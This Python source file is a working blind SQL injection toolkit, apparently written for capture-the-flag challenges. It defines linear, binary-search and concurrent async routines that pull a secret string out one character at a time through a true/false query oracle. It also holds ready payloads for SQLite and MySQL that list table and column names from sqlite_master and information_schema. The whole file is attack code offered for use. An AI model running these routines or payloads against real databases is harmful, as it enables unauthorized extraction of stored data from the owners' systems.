import asyncio
import functools
import string
import time
from collections.abc import Awaitable, Callable, Sequence

default_chars = (
	string.ascii_lowercase
	+ "_"
	+ string.digits
	+ "{}"
	+ string.ascii_uppercase
	+ string.punctuation.translate(str.maketrans("", "", "_{}"))
)

default_chars_full = (
	string.ascii_lowercase
	+ string.digits
	+ "{}"
	+ string.ascii_uppercase
	+ string.punctuation
	+ string.whitespace
).translate(str.maketrans("", "", "%_*?{}")) + "_?*%"
# make sure GLOB and LIKE special characters match last


default_chars_min = string.ascii_lowercase + "_" + string.digits + "{}"


def blind_sqli(
	sqli_oracle: Callable[[str], str],
	inject_template: str = "{}",
	stop_condition: Callable[[str], bool] = lambda val: False,
	chars: Sequence[str] = default_chars,
):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while not stop_condition(val):
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except Exception as e:  # noqa: BLE001
				# really bad error handling
				print(f"ignoring exception {e}")
				time.sleep(1)
				break
		else:
			return val
	return val


def blind_sqli_bsearch(
	sqli_oracle: Callable[[str], str],
	inject_template: str = "{}",
	stop_condition: Callable[[str], bool] = lambda val: False,
	chars: Sequence[str] = default_chars_min,
):
	""" assumes sqli_oracle returns curr < flag"""
	val = ""
	chars = sorted(chars)
	while not stop_condition(val):
		left = 0
		right = len(chars)
		while right - left > 1:
			c = (left + right) // 2
			curr_val = val + chars[c]
			res = sqli_oracle(inject_template.format(curr_val))
			print(curr_val, res)
			if res:
				right = c
			else:
				left = c
		val += chars[left]
		print(val)
	return val


async def _blind_sqli_async_helper(
	sqli_oracle: Callable[[str], Awaitable[str]], inject_template: str, val: str
):
	res = await sqli_oracle(inject_template.format(val))
	print(val, res)
	return res, val


async def blind_sqli_async(
	sqli_oracle: Callable[[str], Awaitable[str]],
	inject_template: str = "{}",
	stop_condition: Callable[[str], bool] = lambda val: False,
	chars: Sequence[str] = default_chars,
):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	helper = functools.partial(_blind_sqli_async_helper, sqli_oracle, inject_template)
	while not stop_condition(val):
		coros = [asyncio.create_task(helper(val + c)) for c in chars]
		for coro in asyncio.as_completed(coros):
			success, curr_val = await coro
			if success:
				for coro2 in coros:
					coro2.cancel()
				val = curr_val
				break
		else:
			return val
	return val


# use with str.replace("$o",offset).replace("$t",table_name)
# because str.format and % formatting can't be used
blind_sqli_payloads = {
	"sqlite": {
		"tables": (
			"(SELECT count(tbl_name) FROM sqlite_master WHERE type='table'"
			" and tbl_name NOT like 'sqlite_%' and tbl_name like '{0}%' limit 1 offset $o) > 0"
		),
		"columns": (
			"(SELECT count(sql) FROM sqlite_master WHERE type='table'"
			" and tbl_name ='$t' and sql like '{0}%' limit 1 offset $o) > 0"
		),
	},
	"mysql": {
		"tables": (
			"(select count(table_name) from information_schema.tables"
			" where table_name like '{0}%' limit 1 offset $o) > 0"
		),
		"columns": (
			"(select count(column_name) from information_schema.columns"
			" where table_name='$t' and column_name like '{0}%' limit 1 offset $o) > 0"
		),
	},
}


def blind_sqli_payload(dbms, typ, offset=0, table_name=""):
	return (
		blind_sqli_payloads[dbms][typ]
		.replace("$o", str(offset))
		.replace("$t", table_name)
	)
